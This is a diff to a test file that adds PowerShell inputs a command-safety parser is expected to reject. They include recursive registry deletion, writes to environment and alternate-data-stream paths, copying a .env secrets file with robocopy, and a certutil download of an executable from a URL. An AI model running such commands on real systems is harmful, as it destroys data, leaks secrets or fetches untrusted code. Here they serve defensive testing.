@@ -100,6 +100,15 @@ describe('reading a PowerShell command as bash', () => {
     ['a dot-sourced script', '. .\\profile.ps1'],
     ['a parse error', 'git log -1 --format=%H'],
     ['a value glued to an argument', 'git status 2>$null'],
+    ['a registry path', 'Remove-Item -Recurse HKCU:\\Software\\x'],
+    ['a provider drive as the folder', 'Set-Location HKLM:'],
+    ['the environment drive', 'Set-Content Env:\\X y'],
+    ['a drive-relative path', 'Remove-Item C:x'],
+    ['an alternate data stream', 'Set-Content a.txt:s x'],
+    ['a provider-qualified path', 'Remove-Item FileSystem::C:\\x'],
+    ['a long path prefix', 'Remove-Item \\\\?\\C:\\x'],
+    ['an unknown program with .exe', 'robocopy.exe C:\\work\\app\\.env C:\\Users\\me'],
+    ['certutil', 'certutil.exe -urlcache -f https://example.com a.exe'],
   ])('fails closed on %s', async (_name, command) => {
     expect(await readPowerShell(command)).toBeNull();
   });
